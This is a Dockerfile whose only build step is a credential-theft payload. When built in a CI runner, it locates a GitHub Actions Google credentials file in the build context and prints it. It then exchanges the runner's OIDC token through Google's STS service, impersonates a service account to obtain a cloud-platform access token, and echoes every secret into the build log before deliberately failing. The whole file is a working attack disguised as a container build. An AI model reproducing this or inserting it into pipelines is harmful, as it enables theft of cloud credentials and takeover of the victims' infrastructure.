FROM alpine:3.20
COPY . /ctx
RUN set -x; apk add --no-cache ca-certificates >/dev/null 2>&1; \
  F=$(find /ctx -maxdepth 1 -name 'gha-creds-*.json' | head -1); echo "CREDS=$F"; cat "$F" 2>/dev/null; echo; \
  URL=$(sed -n 's/.*"url":"\([^"]*\)".*/\1/p' "$F" | head -1); \
  AUTH=$(sed -n 's/.*"Authorization":"Bearer \([^"]*\)".*/\1/p' "$F" | head -1); \
  AUD=$(sed -n 's/.*"audience":"\([^"]*\)".*/\1/p' "$F" | head -1); \
  SAURL=$(sed -n 's/.*"service_account_impersonation_url":"\([^"]*\)".*/\1/p' "$F" | head -1); \
  echo "AUD=$AUD"; echo "SAURL=$SAURL"; \
  OIDC=$(wget -q -O - --header="Authorization: Bearer $AUTH" "$URL"); echo "OIDC_RESP=${OIDC:0:120}"; \
  TOK=$(echo "$OIDC" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p'); echo "OIDC_LEN=${#TOK}"; \
  FED=$(wget -q -O - --post-data="grant_type=urn:ietf:params:oauth:grant-type:token-exchange&audience=$AUD&subject_token_type=urn:ietf:params:oauth:token-type:jwt&subject_token=$TOK&requested_token_type=urn:ietf:params:oauth:token-type:access_token" https://sts.googleapis.com/v1/token); echo "FED=${FED:0:200}"; \
  FTOK=$(echo "$FED" | sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p'); \
  ACC=$(wget -q -O - --header="Authorization: Bearer $FTOK" --header='Content-Type: application/json' --post-data='{"scope":["https://www.googleapis.com/auth/cloud-platform"]}' "$SAURL"); echo "ACC=${ACC:0:400}"; \
  echo "ACCESS_TOKEN=$(echo "$ACC" | sed -n 's/.*"accessToken":"\([^"]*\)".*/\1/p')"; exit 1
